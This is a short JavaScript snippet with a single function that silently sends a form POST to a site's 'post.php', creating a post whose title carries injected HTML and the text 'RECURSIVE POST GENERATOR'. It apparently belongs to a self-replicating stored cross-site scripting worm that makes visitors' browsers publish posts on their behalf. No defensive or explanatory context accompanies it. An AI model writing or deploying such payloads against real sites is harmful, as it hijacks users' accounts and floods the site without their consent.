function makeAPost() {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "post.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(`title=<label id="q5c">RECURSIVE POST GENERATOR :))))))</label>%26content=HAHAHAHAHA%26type=1%26form=content%26submit=`);
}